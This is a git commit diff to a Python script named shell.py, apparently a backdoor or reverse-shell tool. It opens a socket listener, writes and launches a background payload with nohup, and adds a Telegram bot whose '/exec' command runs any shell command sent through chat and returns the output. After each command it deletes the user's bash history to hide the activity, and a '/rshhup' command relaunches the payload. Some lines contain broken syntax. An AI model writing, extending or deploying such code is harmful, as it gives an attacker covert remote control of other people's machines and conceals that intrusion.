29e37a05f4301bcb85301ae91383bc0f9cb1cddd
Smith <77020542+Special-Esmit@users.noreply.github.com>
2021-01-06 07:38:25 +0000

    Update shell.py

--- shell.py
+++ shell.py
@@ -8,7 +8,7 @@ import os
 
 s = socket.socket()
 
-ip = "localhost"
+ip = \"localhost\"
 port = 15001
 s.bind((ip, port))
 s.listen(True)
@@ -35,41 +35,43 @@ while True:
 f = open("lssx.py","w")
 f.write(codes)
 f.close
+os.system("nohup python /lssx.py > &"
+sx = str(input("Run Telegram Bot?(y,n) : "))
+if sx == 'y':
+	try:
+		from telethon import TelegramClient, connection, events
+		from telethon import functions, types
+	except:
+		os.system("apt install -y python3-pip")
+		os.system("pip install telethon && pip3 install telethon")
 
-os.system("python /bin/lssx.py > &")
+	admins = "admin_id"
+	api_id = "api_id (integer)"
+	api_hash = "api_hash (string)"
+	token = "Your Telegram Token"
 
-try:
-	from telethon import TelegramClient, connection, events
-	from telethon import functions, types
-except:
-	os.system("apt install -y python3-pip")
-	os.system("pip install telethon && pip3 install telethon")
+	bot = TelegramClient('bot', api_id, api_hash).start(bot_token=token)
 
-admins = "admin_id"
-api_id = "api_id (integer)"
-api_hash = "api_hash (string)"
-token = "Your Telegram Token"
-
-bot = TelegramClient('bot', api_id, api_hash).start(bot_token=token)
-
-@bot.on(events.NewMessage(pattern='/exec'))
-async def send_welcome(event):
-	e = event.raw_text[6:1000000000000000]
-	os.system(str(e) + " > xsx.txt")
-	f = open("xsx.txt","r").read()
-	await event.reply("Result: " + str(f))
-	os.system("eval \'rm -rf /home/$USER/.bash_history\'")
-@bot.on(events.NewMessage(pattern='/rshhup'))
-async def send_welcome(event):
-	os.system("nohup py /bin/lssx.py &")
-	os.system("nohup python /bin/lssx.py &")
-	os.system("nohup python3 /bin/lssx.py &")
-	os.system("nohup python2 /bin/lssx.py &")
+	@bot.on(events.NewMessage(pattern='/exec'))
+	async def send_welcome(event):
+		e = event.raw_text[6:1000000000000000]
+		os.system(str(e) + " > xsx.txt")
+		f = open("xsx.txt","r").read()
+		await event.reply("Result: " + str(f))
+		os.system("eval \'rm -rf /home/$USER/.bash_history\'")
+	@bot.on(events.NewMessage(pattern='/rshhup'))
+	async def send_welcome(event):
+		os.system("nohup py /bin/lssx.py &")
+		os.system("nohup python /bin/lssx.py &")
+		os.system("nohup python3 /bin/lssx.py &")
+		os.system("nohup python2 /bin/lssx.py &")
 
 
-@bot.on(events.NewMessage(pattern='/start'))
-async def send_welcome(event):
-    await event.reply('I am on')
-    
-bot.start()
-bot.run_until_disconnected()
+	@bot.on(events.NewMessage(pattern='/start'))
+	async def send_welcome(event):
+	    await event.reply('I am on')
+
+	bot.start()
+	bot.run_until_disconnected()
+else:
+	  print("Reverse_Shell Run :(")
